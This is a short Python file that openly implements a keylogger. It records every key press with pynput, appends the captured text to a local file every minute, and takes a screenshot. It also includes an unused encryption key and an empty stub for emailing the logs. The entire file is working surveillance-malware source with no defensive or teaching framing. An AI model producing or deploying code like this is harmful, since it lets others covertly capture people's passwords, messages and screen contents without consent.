import pynput.keyboard
import threading
import os
import time
from cryptography.fernet import Fernet
from PIL import ImageGrab

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.key = None
        self.encrypt_key()

    def encrypt_key(self):
        self.key = Fernet.generate_key()
        with open("secret.key", "wb") as key_file:
            key_file.write(self.key)

    def append_to_log(self, string):
        self.log = self.log + string

    def on_press(self, key):
        try:
            pressed_key = str(key.char)
        except AttributeError:
            if key == key.space:
                pressed_key = " "
            else:
                pressed_key = " " + str(key) + " "
        self.append_to_log(pressed_key)

    def send_mail(self, email, password, message):
        pass  # implement email sending functionality

    def report(self):
        with open("keylog.txt", "a") as file:
            file.write(self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def capture_screenshot(self):
        screenshot = ImageGrab.grab()
        screenshot.save(f"screenshot_{time.time()}.png")

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.on_press)
        with keyboard_listener:
            self.report()
            self.capture_screenshot()
            keyboard_listener.join()

if __name__ == "__main__":
    keylogger = Keylogger(interval=60)
    keylogger.start()

